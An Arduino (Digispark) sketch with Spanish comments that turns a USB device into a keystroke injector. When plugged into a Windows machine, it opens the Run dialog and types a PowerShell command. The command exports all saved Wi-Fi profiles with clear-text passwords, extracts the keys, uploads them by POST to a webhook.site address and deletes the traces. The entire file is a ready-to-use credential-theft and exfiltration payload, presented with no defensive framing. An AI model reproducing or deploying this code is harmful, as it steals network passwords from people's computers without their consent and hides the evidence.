#include "DigiKeyboard.h"

void setup() {
  // Inicializa la librería y espera a que el sistema operativo detecte el dispositivo.
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); 

  // 1. Abrir el diálogo "Ejecutar" (Win + R)
  // MOD_GUI_LEFT es la tecla de Windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 2. Escribir el comando completo.
  
  // EJECUTAR COMANDOS.
  DigiKeyboard.print("powershell -Command \"cd $env:TEMP; netsh wlan export profile key=clear; sls Wi*.xml -Pattern 'keyMaterial' | Out-File Wi-Fi-PASS; Invoke-WebRequest -Uri https://webhook.site/<webhook-url> -Method POST -InFile Wi-Fi-PASS; rm Wi-* -Force\"");
  DigiKeyboard.delay(500);

  // Presionar Enter para confirmar
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(4000); // Esperar a que se abra PowerShell (o falle)
  
  // Evita que el microcontrolador se reinicie y ejecute el comando repetidamente.
  for(;;){} 
}

void loop() {
  // El bucle loop se deja vacío para que el script solo se ejecute una vez
  // en el setup.
}

